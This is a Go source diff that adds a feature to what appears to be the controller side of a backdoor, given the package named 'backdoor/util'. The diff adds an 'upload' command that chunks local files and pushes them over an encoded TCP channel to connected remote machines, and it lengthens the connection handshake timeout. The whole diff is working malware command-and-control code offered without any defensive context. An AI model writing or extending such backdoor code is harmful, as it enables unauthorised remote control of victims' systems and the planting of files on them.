@@ -3,10 +3,12 @@ package main
 import (
 	"backdoor/util"
 	"bufio"
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"net"
 	"os"
+	"path/filepath"
 	"strings"
 	"sync/atomic"
 	"time"
@@ -118,12 +120,45 @@ func write(cmdchan chan string, conn net.Conn) {
 		if !ok {
 			break
 		}
-		var req util.Request
-		req.Magic = util.Magic
-		req.Cmd = cmd
-		jsonBytes, _ := json.Marshal(&req)
-		util.TcpWriteMsg(conn, pencoder.Encode(jsonBytes))
+		if strings.HasPrefix(cmd, "upload ") {
+			uploadFile(strings.TrimSpace(cmd[strings.Index(cmd, " "):]), conn, pencoder)
+		} else {
+			var req util.Request
+			req.Magic = util.Magic
+			req.Cmd = cmd
+			jsonBytes, _ := json.Marshal(&req)
+			util.TcpWriteMsg(conn, pencoder.Encode(jsonBytes))
+		}
 	}
+}
+
+func uploadFile(file string, conn net.Conn, pencoder *util.Encoder) {
+	contents, err := os.ReadFile(file)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	if len(contents) == 0 {
+		return
+	}
+	var buffer bytes.Buffer
+	buffer.WriteString("up ")
+	buffer.WriteString(filepath.Base(file))
+	util.TcpWriteMsg(conn, pencoder.Encode(buffer.Bytes()))
+	for beg := 0; beg < len(contents); {
+		end := beg + 2048
+		if end > len(contents) {
+			end = len(contents)
+		}
+		buffer.Reset()
+		buffer.WriteString("up ")
+		buffer.Write(contents[beg:end])
+		util.TcpWriteMsg(conn, pencoder.Encode(buffer.Bytes()))
+		beg = end
+	}
+	buffer.Reset()
+	buffer.WriteString("up ")
+	util.TcpWriteMsg(conn, pencoder.Encode(buffer.Bytes()))
 }
 
 func loopListen(listener net.Listener) {
@@ -137,7 +172,7 @@ func loopListen(listener net.Listener) {
 }
 
 func newConn(conn net.Conn) {
-	infobytes, err := util.TcpReadMsg(conn, 12*time.Second)
+	infobytes, err := util.TcpReadMsg(conn, 30*time.Second)
 	if err != nil {
 		conn.Close()
 		return
